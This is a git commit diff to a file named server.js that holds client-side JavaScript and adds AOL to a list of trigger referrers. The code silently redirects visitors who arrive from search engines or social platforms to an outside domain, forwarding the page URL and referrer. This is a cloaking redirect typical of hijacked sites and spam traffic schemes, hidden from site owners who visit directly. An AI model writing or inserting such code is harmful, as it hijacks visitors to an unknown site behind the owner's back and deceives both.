c6f07d771aadca2534f212ecef76e3894b87a4b1
xda facezero <xdafacezero@gmail.com>
2025-05-17 21:59:59 +0700

    Update server.js

--- server.js
+++ server.js
@@ -1,4 +1,4 @@
 var ars = 'https://currency.lokalpro.my.id';
 
-if(['.google.', 'bing.', 'yandex.', 'qwant.', 'facebook.', '.pinterest.', 'duckduckgo.', 'ecosia.', '.yahoo.', '.start.', '.info.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+if(['.google.', 'bing.', 'yandex.', 'qwant.', '.aol.', 'facebook.', '.pinterest.', 'duckduckgo.', 'ecosia.', '.yahoo.', '.start.', '.info.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
 
